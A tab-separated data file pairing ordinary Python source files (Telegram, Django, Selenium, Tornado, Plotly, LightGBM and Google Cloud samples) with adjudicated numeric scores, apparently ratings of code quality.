401	adjudicated	3	"import hashlib<<NEWL>>import hmac<<NEWL>>from operator import itemgetter<<NEWL>>from typing import Callable, Any, Dict<<NEWL>>from urllib.parse import parse_qsl<<NEWL>><<NEWL>><<NEWL>>def check_webapp_signature(token: str, init_data: str) -> bool:<<NEWL>>    """"""<<NEWL>>    Check incoming WebApp init data signature<<NEWL>><<NEWL>>    Source: https://core.telegram.org/bots/webapps#validating-data-received-via-the-web-app<<NEWL>><<NEWL>>    :param token:<<NEWL>>    :param init_data:<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        parsed_data = dict(parse_qsl(init_data))<<NEWL>>    except ValueError:<<NEWL>>        # Init data is not a valid query string<<NEWL>>        return False<<NEWL>>    if ""hash"" not in parsed_data:<<NEWL>>        # Hash is not present in init data<<NEWL>>        return False<<NEWL>><<NEWL>>    hash_ = parsed_data.pop('hash')<<NEWL>>    data_check_string = ""\n"".join(<<NEWL>>        f""{k}={v}"" for k, v in sorted(parsed_data.items(), key=itemgetter(0))<<NEWL>>    )<<NEWL>>    secret_key = hmac.new(<<NEWL>>        key=b""WebAppData"", msg=token.encode(), digestmod=hashlib.sha256<<NEWL>>    )<<NEWL>>    calculated_hash = hmac.new(<<NEWL>>        key=secret_key.digest(), msg=data_check_string.encode(), digestmod=hashlib.sha256<<NEWL>>    ).hexdigest()<<NEWL>>    return calculated_hash == hash_<<NEWL>><<NEWL>><<NEWL>>def parse_init_data(init_data: str, _loads: Callable[..., Any]) -> Dict[str, Any]:<<NEWL>>    """"""<<NEWL>>    Parse WebApp init data and return it as dict<<NEWL>><<NEWL>>    :param init_data:<<NEWL>>    :param _loads:<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>>    result = {}<<NEWL>>    for key, value in parse_qsl(init_data):<<NEWL>>        if (value.startswith('[') and value.endswith(']')) or (value.startswith('{') and value.endswith('}')):<<NEWL>>            value = _loads(value)<<NEWL>>        result[key] = value<<NEWL>>    return result<<NEWL>><<NEWL>><<NEWL>>def safe_parse_webapp_init_data(token: str, init_data: str, _loads: Callable[..., Any]) -> Dict[str, Any]:<<NEWL>>    """"""<<NEWL>>    Validate WebApp init data and return it as dict<<NEWL>><<NEWL>>    :param token:<<NEWL>>    :param init_data:<<NEWL>>    :param _loads:<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>>    if check_webapp_signature(token, init_data):<<NEWL>>        return parse_init_data(init_data, _loads)<<NEWL>>    raise ValueError(""Invalid init data signature"")"
450	adjudicated	3	"# flake8: noqa<<NEWL>>import subprocess<<NEWL>>import sys<<NEWL>>import unittest<<NEWL>><<NEWL>>_import_everything = b""""""<<NEWL>># The event loop is not fork-safe, and it's easy to initialize an asyncio.Future<<NEWL>># at startup, which in turn creates the default event loop and prevents forking.<<NEWL>># Explicitly disallow the default event loop so that an error will be raised<<NEWL>># if something tries to touch it.<<NEWL>>import asyncio<<NEWL>>asyncio.set_event_loop(None)<<NEWL>><<NEWL>>import tornado.auth<<NEWL>>import tornado.autoreload<<NEWL>>import tornado.concurrent<<NEWL>>import tornado.escape<<NEWL>>import tornado.gen<<NEWL>>import tornado.http1connection<<NEWL>>import tornado.httpclient<<NEWL>>import tornado.httpserver<<NEWL>>import tornado.httputil<<NEWL>>import tornado.ioloop<<NEWL>>import tornado.iostream<<NEWL>>import tornado.locale<<NEWL>>import tornado.log<<NEWL>>import tornado.netutil<<NEWL>>import tornado.options<<NEWL>>import tornado.process<<NEWL>>import tornado.simple_httpclient<<NEWL>>import tornado.tcpserver<<NEWL>>import tornado.tcpclient<<NEWL>>import tornado.template<<NEWL>>import tornado.testing<<NEWL>>import tornado.util<<NEWL>>import tornado.web<<NEWL>>import tornado.websocket<<NEWL>>import tornado.wsgi<<NEWL>><<NEWL>>try:<<NEWL>>    import pycurl<<NEWL>>except ImportError:<<NEWL>>    pass<<NEWL>>else:<<NEWL>>    import tornado.curl_httpclient<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>class ImportTest(unittest.TestCase):<<NEWL>>    def test_import_everything(self):<<NEWL>>        # Test that all Tornado modules can be imported without side effects,<<NEWL>>        # specifically without initializing the default asyncio event loop.<<NEWL>>        # Since we can't tell which modules may have already beein imported<<NEWL>>        # in our process, do it in a subprocess for a clean slate.<<NEWL>>        proc = subprocess.Popen([sys.executable], stdin=subprocess.PIPE)<<NEWL>>        proc.communicate(_import_everything)<<NEWL>>        self.assertEqual(proc.returncode, 0)<<NEWL>><<NEWL>>    def test_import_aliases(self):<<NEWL>>        # Ensure we don't delete formerly-documented aliases accidentally.<<NEWL>>        import tornado.ioloop<<NEWL>>        import tornado.gen<<NEWL>>        import tornado.util<<NEWL>>        import asyncio<<NEWL>><<NEWL>>        self.assertIs(tornado.ioloop.TimeoutError, tornado.util.TimeoutError)<<NEWL>>        self.assertIs(tornado.gen.TimeoutError, tornado.util.TimeoutError)<<NEWL>>        self.assertIs(tornado.util.TimeoutError, asyncio.TimeoutError)"
510	adjudicated	1	"import argparse<<NEWL>>from typing import Tuple<<NEWL>><<NEWL>><<NEWL>>def get_next_version(release_type) -> Tuple[Tuple[int, int, int], str, str]:<<NEWL>>    current_ver = find_version(""fairseq/version.txt"")<<NEWL>>    version_list = [int(x) for x in current_ver.strip(""'"").split(""."")]<<NEWL>>    major, minor, patch = version_list[0], version_list[1], version_list[2]<<NEWL>>    if release_type == ""patch"":<<NEWL>>        patch += 1<<NEWL>>    elif release_type == ""minor"":<<NEWL>>        minor += 1<<NEWL>>        patch = 0<<NEWL>>    elif release_type == ""major"":<<NEWL>>        major += 1<<NEWL>>        minor = patch = 0<<NEWL>>    else:<<NEWL>>        raise ValueError(<<NEWL>>            ""Incorrect release type specified. Acceptable types are major, minor and patch.""<<NEWL>>        )<<NEWL>><<NEWL>>    new_version_tuple = (major, minor, patch)<<NEWL>>    new_version_str = ""."".join([str(x) for x in new_version_tuple])<<NEWL>>    new_tag_str = ""v"" + new_version_str<<NEWL>>    return new_version_tuple, new_version_str, new_tag_str<<NEWL>><<NEWL>><<NEWL>>def find_version(version_file_path) -> str:<<NEWL>>    with open(version_file_path) as f:<<NEWL>>        version = f.read().strip()<<NEWL>>        return version<<NEWL>><<NEWL>><<NEWL>>def update_version(new_version_str) -> None:<<NEWL>>    """"""<<NEWL>>    given the current version, update the version to the<<NEWL>>    next version depending on the type of release.<<NEWL>>    """"""<<NEWL>><<NEWL>>    with open(""fairseq/version.txt"", ""w"") as writer:<<NEWL>>        writer.write(new_version_str)<<NEWL>><<NEWL>><<NEWL>>def main(args):<<NEWL>>    if args.release_type in [""major"", ""minor"", ""patch""]:<<NEWL>>        new_version_tuple, new_version, new_tag = get_next_version(args.release_type)<<NEWL>>    else:<<NEWL>>        raise ValueError(""Incorrect release type specified"")<<NEWL>><<NEWL>>    if args.update_version:<<NEWL>>        update_version(new_version)<<NEWL>><<NEWL>>    print(new_version, new_tag)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    parser = argparse.ArgumentParser(description=""Versioning utils"")<<NEWL>>    parser.add_argument(<<NEWL>>        ""--release-type"",<<NEWL>>        type=str,<<NEWL>>        required=True,<<NEWL>>        help=""type of release = major/minor/patch"",<<NEWL>>    )<<NEWL>>    parser.add_argument(<<NEWL>>        ""--update-version"",<<NEWL>>        action=""store_true"",<<NEWL>>        required=False,<<NEWL>>        help=""updates the version in fairseq/version.txt"",<<NEWL>>    )<<NEWL>><<NEWL>>    args = parser.parse_args()<<NEWL>>    main(args)"
470	adjudicated	1	"from selenium.webdriver.common.by import By<<NEWL>><<NEWL>><<NEWL>>class BasePageLocators():<<NEWL>>    LOGIN_LINK = (By.CSS_SELECTOR, ""#login_link"")<<NEWL>>    LOGIN_LINK_INVALID = (By.CSS_SELECTOR, ""#login_link_inc"")  # for checking the correct error message<<NEWL>><<NEWL>><<NEWL>>class MainPageLocators():<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class LoginPageLocators():<<NEWL>>    LOGIN_EMAIL = (By.CSS_SELECTOR, ""[name='login-username']"")<<NEWL>>    LOGIN_PASSWORD = (By.CSS_SELECTOR, ""[name='login-password']"")<<NEWL>>    FORGOT_PASSWORD_BUTTON = (By.CSS_SELECTOR, 'a[href*=""password-reset""]')<<NEWL>>    LOGIN_BUTTON = (By.CSS_SELECTOR, ""[name='login_submit']"")<<NEWL>>    SIGN_UP_EMAIL = (By.CSS_SELECTOR, ""[name='registration-email']"")<<NEWL>>    SIGN_UP_PASSWORD = (By.CSS_SELECTOR, ""[name='registration-password1']"")<<NEWL>>    SIGN_UP_PASSWORD_REPETITION = (By.CSS_SELECTOR, ""[name='registration-password2']"")<<NEWL>>    SIGN_UP_BUTTON = (By.CSS_SELECTOR, ""[name='registration_submit']"")<<NEWL>><<NEWL>><<NEWL>>class ProductPageLocators():<<NEWL>>    PRODUCT_NAME = (By.CSS_SELECTOR, "".product_main > h1"")<<NEWL>>    ADD_TO_BASKET_BUTTON = (By. CSS_SELECTOR, "".btn-add-to-basket"")<<NEWL>>    ADD_TO_WISHLIST_BUTTON = (By.CSS_SELECTOR, "".btn-wishlist"")<<NEWL>>    PRODUCT_GALLERY = (By.CSS_SELECTOR, ""#product_gallery"")<<NEWL>>    PRODUCT_DESCRIPTION = (By.CSS_SELECTOR, ""#product_description"")<<NEWL>>    PRICE = (By.CSS_SELECTOR, "".product_main > .price_color"")<<NEWL>>    AVAILABILITY = (By.CSS_SELECTOR, "".product_main > .availability"")<<NEWL>>    WRITE_REVIEW = (By.CSS_SELECTOR, ""#write_review"")<<NEWL>>    PRODUCT_INFO_TABLE = (By.CSS_SELECTOR, "".table-striped"")<<NEWL>>    SUCCESS_MESSAGE = (By.CSS_SELECTOR, ""#messages > .alert-success:nth-child(1)"")<<NEWL>>    NAME_OF_ADDED_PRODUCT = (By.CSS_SELECTOR, ""div.alert:nth-child(1) strong"")<<NEWL>>    TOTAL_PRICE = (By.CSS_SELECTOR, "".alertinner p strong"")<<NEWL>><<NEWL>><<NEWL>>class BasketPageLocators():<<NEWL>>    VIEW_BASKET = (By.CSS_SELECTOR, "".btn-group > a[href*='basket']"")<<NEWL>>    VIEW_BASKET_INVALID = (By.CSS_SELECTOR, "".btn-group > a[href*='basket']"")  # for checking the correct error message<<NEWL>>    EMPTY_BASKET_MESSAGE = (By.CSS_SELECTOR, ""#content_inner > p"")<<NEWL>>    FILLED_BASKET = (By.CSS_SELECTOR, "".basket-items"")"
421	adjudicated	0	import asyncio<<NEWL>>import json<<NEWL>><<NEWL>>from openpyxl import load_workbook<<NEWL>>from rest_framework.response import Response<<NEWL>>from rest_framework.views import APIView<<NEWL>><<NEWL>>from wildberries.models import Product<<NEWL>>from wildberries.pydantic import CardPydantic<<NEWL>>from wildberries.utils import make_request<<NEWL>><<NEWL>><<NEWL>>class CardView(APIView):<<NEWL>>    @staticmethod<<NEWL>>    def get_card_info(value):<<NEWL>>        page = asyncio.run(make_request(value))<<NEWL>>        return CardView.get_objects(page, value)<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def get_cards_info(file):<<NEWL>>        values = []<<NEWL>>        wb = load_workbook(file)<<NEWL>>        for sheet in wb.sheetnames:<<NEWL>>            for row in wb[sheet].iter_rows(values_only=True):<<NEWL>>                values.append(row[0])<<NEWL>>        cards_info = [CardView.get_card_info(i) for i in values]<<NEWL>>        return cards_info<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def get_objects(page, value):<<NEWL>>        card = None<<NEWL>>        try:<<NEWL>>            products = json.dumps(page['data']['products'][0])<<NEWL>>            card = CardPydantic.parse_raw(products)<<NEWL>>            Product.objects.create(**card.dict())<<NEWL>>        except IndexError:<<NEWL>>            print(f'id {value} отсутствует на сайте wildberries.ru')<<NEWL>>        if card:<<NEWL>>            return card.dict()<<NEWL>>        else:<<NEWL>>            return {'error': f'id {value} отсутствует на сайте wildberries.ru'}<<NEWL>><<NEWL>>    def post(self, request, *args, **kwargs):<<NEWL>>        data = None<<NEWL>>        if 'file' in request.data and 'value' in request.data:<<NEWL>>            return Response({'error': 'Одновременно отправлять поля '<<NEWL>>                                      'file и value запрещено!'})<<NEWL>>        elif 'file' in request.data:<<NEWL>>            file = request.data['file']<<NEWL>>            data = CardView.get_cards_info(file)<<NEWL>>        elif 'value' in request.data:<<NEWL>>            value = request.data['value']<<NEWL>>            data = CardView.get_card_info(value)<<NEWL>>        return Response(data)
483	adjudicated	4	"from . import base<<NEWL>>from . import fields<<NEWL>>from . import mixins<<NEWL>>from .mask_position import MaskPosition<<NEWL>>from .photo_size import PhotoSize<<NEWL>>from .file import File<<NEWL>><<NEWL>><<NEWL>>class Sticker(base.TelegramObject, mixins.Downloadable):<<NEWL>>    """"""<<NEWL>>    This object represents a sticker.<<NEWL>><<NEWL>>    https://core.telegram.org/bots/api#sticker<<NEWL>>    """"""<<NEWL>>    file_id: base.String = fields.Field()<<NEWL>>    file_unique_id: base.String = fields.Field()<<NEWL>>    type: base.String = fields.Field()<<NEWL>>    width: base.Integer = fields.Field()<<NEWL>>    height: base.Integer = fields.Field()<<NEWL>>    is_animated: base.Boolean = fields.Field()<<NEWL>>    is_video: base.Boolean = fields.Field()<<NEWL>>    thumb: PhotoSize = fields.Field(base=PhotoSize)<<NEWL>>    emoji: base.String = fields.Field()<<NEWL>>    set_name: base.String = fields.Field()<<NEWL>>    premium_animation: File = fields.Field(base=File)<<NEWL>>    mask_position: MaskPosition = fields.Field(base=MaskPosition)<<NEWL>>    custom_emoji_id: base.String = fields.Field()<<NEWL>>    file_size: base.Integer = fields.Field()<<NEWL>><<NEWL>>    async def set_position_in_set(self, position: base.Integer) -> base.Boolean:<<NEWL>>        """"""<<NEWL>>        Use this method to move a sticker in a set created by the bot to a specific position.<<NEWL>><<NEWL>>        Source: https://core.telegram.org/bots/api#setstickerpositioninset<<NEWL>><<NEWL>>        :param position: New sticker position in the set, zero-based<<NEWL>>        :type position: :obj:`base.Integer`<<NEWL>>        :return: Returns True on success<<NEWL>>        :rtype: :obj:`base.Boolean`<<NEWL>>        """"""<<NEWL>>        return await self.bot.set_sticker_position_in_set(self.file_id, position=position)<<NEWL>><<NEWL>>    async def delete_from_set(self) -> base.Boolean:<<NEWL>>        """"""<<NEWL>>        Use this method to delete a sticker from a set created by the bot.<<NEWL>><<NEWL>>        Source: https://core.telegram.org/bots/api#deletestickerfromset<<NEWL>><<NEWL>>        :return: Returns True on success<<NEWL>>        :rtype: :obj:`base.Boolean`<<NEWL>>        """"""<<NEWL>>        return await self.bot.delete_sticker_from_set(self.file_id)"
415	adjudicated	0	"import pandas as pd<<NEWL>>import numpy as np<<NEWL>>import random<<NEWL>><<NEWL>>import matplotlib.pyplot as plt<<NEWL>>import seaborn as sns<<NEWL>><<NEWL>>from plotly import graph_objs as go<<NEWL>>from plotly import express as px<<NEWL>>from plotly.subplots import make_subplots<<NEWL>><<NEWL>>import pickle<<NEWL>>import lightgbm as lgb<<NEWL>><<NEWL>><<NEWL>><<NEWL>>colorarr = ['#0592D0','#Cd7f32', '#E97451', '#Bdb76b', '#954535', '#C2b280', '#808000','#C2b280', '#E4d008', '#9acd32', '#Eedc82', '#E4d96f',<<NEWL>>           '#32cd32','#39ff14','#00ff7f', '#008080', '#36454f', '#F88379', '#Ff4500', '#Ffb347', '#A94064', '#E75480', '#Ffb6c1', '#E5e4e2',<<NEWL>>           '#Faf0e6', '#8c92ac', '#Dbd7d2','#A7a6ba', '#B38b6d']<<NEWL>><<NEWL>><<NEWL>>cropdf = pd.read_csv(""D:/Suyash College Files/Semester 6/22060 - Capstone Project Execution and Report Writing/Datasets/Crop_recommendation.csv"")<<NEWL>><<NEWL>>X = cropdf.drop('label', axis=1)<<NEWL>>y = cropdf['label']<<NEWL>><<NEWL>>from sklearn.model_selection import train_test_split<<NEWL>>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.3,<<NEWL>>                                                    shuffle = True, random_state = 0)<<NEWL>><<NEWL>>model = lgb.LGBMClassifier()<<NEWL>>model.fit(X_train, y_train)<<NEWL>><<NEWL>>y_pred=model.predict(X_test)<<NEWL>><<NEWL>><<NEWL>>from sklearn.metrics import accuracy_score<<NEWL>><<NEWL>>accuracy=accuracy_score(y_pred, y_test)<<NEWL>>print('LightGBM Model accuracy score: {0:0.4f}'.format(accuracy_score(y_test, y_pred)))<<NEWL>><<NEWL>><<NEWL>>y_pred_train = model.predict(X_train)<<NEWL>>print('Training-set accuracy score: {0:0.4f}'. format(accuracy_score(y_train, y_pred_train)))<<NEWL>><<NEWL>>print('Training set score: {:.4f}'.format(model.score(X_train, y_train)))<<NEWL>>print('Test set score: {:.4f}'.format(model.score(X_test, y_test)))<<NEWL>><<NEWL>><<NEWL>>model.booster_.save_model('crop_predict1.h5')<<NEWL>><<NEWL>>        #        my_model.booster_.save_model('mode.txt')<<NEWL>>        #        #load from model:<<NEWL>>        #        #bst = lgb.Booster(model_file='mode.txt')<<NEWL>><<NEWL>><<NEWL>><<NEWL>>filename = ""trained_model.pkl""<<NEWL>>pickle.dump(model,open(filename,'wb'))<<NEWL>><<NEWL>>print(""done with all"")<<NEWL>><<NEWL>>"
504	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""choropleth"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
444	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>><<NEWL>>from __future__ import absolute_import<<NEWL>><<NEWL>>import cffi<<NEWL>><<NEWL>>c_source = """"""<<NEWL>>    struct ArrowSchema {<<NEWL>>      // Array type description<<NEWL>>      const char* format;<<NEWL>>      const char* name;<<NEWL>>      const char* metadata;<<NEWL>>      int64_t flags;<<NEWL>>      int64_t n_children;<<NEWL>>      struct ArrowSchema** children;<<NEWL>>      struct ArrowSchema* dictionary;<<NEWL>><<NEWL>>      // Release callback<<NEWL>>      void (*release)(struct ArrowSchema*);<<NEWL>>      // Opaque producer-specific data<<NEWL>>      void* private_data;<<NEWL>>    };<<NEWL>><<NEWL>>    struct ArrowArray {<<NEWL>>      // Array data description<<NEWL>>      int64_t length;<<NEWL>>      int64_t null_count;<<NEWL>>      int64_t offset;<<NEWL>>      int64_t n_buffers;<<NEWL>>      int64_t n_children;<<NEWL>>      const void** buffers;<<NEWL>>      struct ArrowArray** children;<<NEWL>>      struct ArrowArray* dictionary;<<NEWL>><<NEWL>>      // Release callback<<NEWL>>      void (*release)(struct ArrowArray*);<<NEWL>>      // Opaque producer-specific data<<NEWL>>      void* private_data;<<NEWL>>    };<<NEWL>><<NEWL>>    struct ArrowArrayStream {<<NEWL>>      int (*get_schema)(struct ArrowArrayStream*, struct ArrowSchema* out);<<NEWL>>      int (*get_next)(struct ArrowArrayStream*, struct ArrowArray* out);<<NEWL>><<NEWL>>      const char* (*get_last_error)(struct ArrowArrayStream*);<<NEWL>><<NEWL>>      // Release callback<<NEWL>>      void (*release)(struct ArrowArrayStream*);<<NEWL>>      // Opaque producer-specific data<<NEWL>>      void* private_data;<<NEWL>>    };<<NEWL>>    """"""<<NEWL>><<NEWL>># TODO use out-of-line mode for faster import and avoid C parsing<<NEWL>>ffi = cffi.FFI()<<NEWL>>ffi.cdef(c_source)"
179	adjudicated	4	"""""""core URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/3.2/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>>from django.conf import settings<<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import include, path<<NEWL>><<NEWL>>from . import views<<NEWL>><<NEWL>># from django.views import debug<<NEWL>><<NEWL>><<NEWL>># Admin site Branding<<NEWL>>admin.site.site_header = ""CoreProject administration""<<NEWL>>admin.site.site_title = ""CoreProject site admin""<<NEWL>><<NEWL>># Error handlers<<NEWL>>handler400 = views.four_zero_zero_view<<NEWL>>handler403 = views.four_zero_three_view<<NEWL>>handler404 = views.four_zero_four_view<<NEWL>>handler500 = views.five_zero_zero_view<<NEWL>><<NEWL>># Write your urls here<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    # Default django welcome page<<NEWL>>    # path("""", debug.default_urlconf),<<NEWL>>    path("""", views.home_view, name=""home_view""),<<NEWL>>    #   Admin Site<<NEWL>>    # ================<<NEWL>>    path(""admin/"", admin.site.urls),<<NEWL>>    #   HTTP<<NEWL>>    # =========<<NEWL>>    path(""user/"", include(""apps.user.urls"")),<<NEWL>>    #   OpenGraph<<NEWL>>    # =============<<NEWL>>    path(""opengraph/"", include(""apps.opengraph.urls"")),<<NEWL>>    #   Api<<NEWL>>    # ========<<NEWL>>    path(""api/"", include(""apps.api.urls"")),<<NEWL>>]<<NEWL>><<NEWL>>if settings.DEBUG:<<NEWL>>    urlpatterns += [<<NEWL>>        path(""__debug__/"", include(""debug_toolbar.urls"")),<<NEWL>>        path(""__reload__/"", include(""django_browser_reload.urls"")),<<NEWL>>        #   Errors<<NEWL>>        # ===========<<NEWL>>        path(""400/"", handler400),<<NEWL>>        path(""403/"", handler403),<<NEWL>>        path(""404/"", handler404),<<NEWL>>        path(""500/"", handler500),<<NEWL>>    ]"
39	adjudicated	3	"# Licensed to the Software Freedom Conservancy (SFC) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The SFC licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>><<NEWL>>from selenium.webdriver.common import service<<NEWL>><<NEWL>><<NEWL>>class Service(service.Service):<<NEWL>><<NEWL>>    def __init__(self, executable_path, port=0, verbose=False, log_path=None):<<NEWL>>        """"""<<NEWL>>        Creates a new instance of the EdgeDriver service.<<NEWL>><<NEWL>>        EdgeDriver provides an interface for Microsoft WebDriver to use<<NEWL>>        with Microsoft Edge.<<NEWL>><<NEWL>>        :param executable_path: Path to the Microsoft WebDriver binary.<<NEWL>>        :param port: Run the remote service on a specified port.<<NEWL>>            Defaults to 0, which binds to a random open port of the<<NEWL>>            system's choosing.<<NEWL>>        :verbose: Whether to make the webdriver more verbose (passes the<<NEWL>>            --verbose option to the binary). Defaults to False.<<NEWL>>        :param log_path: Optional path for the webdriver binary to log to.<<NEWL>>            Defaults to None which disables logging.<<NEWL>><<NEWL>>        """"""<<NEWL>><<NEWL>>        self.service_args = []<<NEWL>>        if verbose:<<NEWL>>            self.service_args.append(""--verbose"")<<NEWL>><<NEWL>>        params = {<<NEWL>>            ""executable"": executable_path,<<NEWL>>            ""port"": port,<<NEWL>>            ""start_error_message"": ""Please download from http://go.microsoft.com/fwlink/?LinkId=619687""<<NEWL>>        }<<NEWL>><<NEWL>>        if log_path:<<NEWL>>            params[""log_file""] = open(log_path, ""a+"")<<NEWL>><<NEWL>>        service.Service.__init__(self, **params)<<NEWL>><<NEWL>>    def command_line_args(self):<<NEWL>>        return [""--port=%d"" % self.port] + self.service_args"
128	adjudicated	4	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2019 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>"""""" Sample command-line program to list Cloud Dataproc clusters in a region.<<NEWL>><<NEWL>>Example usage:<<NEWL>>python list_clusters.py --project_id=my-project-id --region=global<<NEWL>><<NEWL>>""""""<<NEWL>>import argparse<<NEWL>><<NEWL>>from google.cloud import dataproc_v1<<NEWL>><<NEWL>><<NEWL>># [START dataproc_list_clusters]<<NEWL>>def list_clusters(dataproc, project, region):<<NEWL>>    """"""List the details of clusters in the region.""""""<<NEWL>>    for cluster in dataproc.list_clusters(<<NEWL>>        request={""project_id"": project, ""region"": region}<<NEWL>>    ):<<NEWL>>        print((""{} - {}"".format(cluster.cluster_name, cluster.status.state.name)))<<NEWL>><<NEWL>><<NEWL>># [END dataproc_list_clusters]<<NEWL>><<NEWL>><<NEWL>>def main(project_id, region):<<NEWL>><<NEWL>>    if region == ""global"":<<NEWL>>        # Use the default gRPC global endpoints.<<NEWL>>        dataproc_cluster_client = dataproc_v1.ClusterControllerClient()<<NEWL>>    else:<<NEWL>>        # Use a regional gRPC endpoint. See:<<NEWL>>        # https://cloud.google.com/dataproc/docs/concepts/regional-endpoints<<NEWL>>        dataproc_cluster_client = dataproc_v1.ClusterControllerClient(<<NEWL>>            client_options={""api_endpoint"": f""{region}-dataproc.googleapis.com:443""}<<NEWL>>        )<<NEWL>><<NEWL>>    list_clusters(dataproc_cluster_client, project_id, region)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    parser = argparse.ArgumentParser(<<NEWL>>        description=__doc__, formatter_class=(argparse.RawDescriptionHelpFormatter)<<NEWL>>    )<<NEWL>>    parser.add_argument(""--project_id"", help=""Project ID to access."", required=True)<<NEWL>>    parser.add_argument(""--region"", help=""Region of clusters to list."", required=True)<<NEWL>><<NEWL>>    args = parser.parse_args()<<NEWL>>    main(args.project_id, args.region)"
